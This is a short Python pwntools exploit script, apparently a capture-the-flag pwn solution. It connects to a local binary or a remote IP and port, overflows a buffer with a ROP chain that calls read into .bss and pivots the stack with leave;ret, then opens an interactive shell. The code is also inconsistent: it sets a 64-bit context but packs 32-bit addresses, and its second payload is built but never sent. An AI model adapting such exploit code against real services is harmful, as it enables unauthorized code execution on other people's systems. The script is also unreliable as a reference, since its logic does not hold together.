#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/06/12 19:15:20
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
# here put the import lib
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
context.log_level = 'debug'
context.arch = 'amd64'
if debug:
    sh = process('test')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_offset = [0x45226,0x4527a,0xf03a4,0xf1247]
else:
    IP = '39.105.138.97'
    port = 1234
    sh = remote(IP,port)
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so')
    one_offset = [0x45216,0x4526a,0xf02a4,0xf1147]
elf = ELF('test')


read_plt = elf.plt['read']
ppp_ret = 0x08049581
pop_ebp_ret = 0x08049583
bss_addr = 0x0804C080
leave_ret = 0x080491a5
payload = p32(0) + 'a'*44
sh.send(payload)
sleep(0.1)
payload = 'b' * 32
sh.send(payload)
sleep(0.1)
sh.sendline("hello_boy ")
sh.sendline(str(1))
sh.send(str(0x0804C080))
offset = 0x4c
payload_1 = 'a' * offset + p32(read_plt) + p32(ppp_ret) + p32(0) + p32(bss_addr) + p32(100)
payload_1 += p32(pop_ebp_ret) + p32(bss_addr) + p32(leave_ret)
sh.sendline(payload_1)
payload_2 = "aaaa"
payload += p32(read_plt) + p32(0) + p32(bss_addr+80) + p32(7)
sh.interactive()